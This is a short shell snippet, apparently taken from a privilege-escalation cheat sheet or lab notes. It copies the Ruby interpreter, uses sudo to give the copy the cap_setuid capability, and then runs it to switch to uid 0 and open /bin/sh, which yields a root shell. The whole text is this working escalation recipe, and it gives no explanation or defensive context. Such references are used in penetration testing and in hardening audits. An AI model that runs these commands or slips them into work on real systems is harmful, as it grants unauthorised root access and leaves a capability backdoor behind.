cp $(which ruby) .
sudo setcap cap_setuid+ep ruby

./ruby -e 'Process::Sys.setuid(0); exec "/bin/sh"'
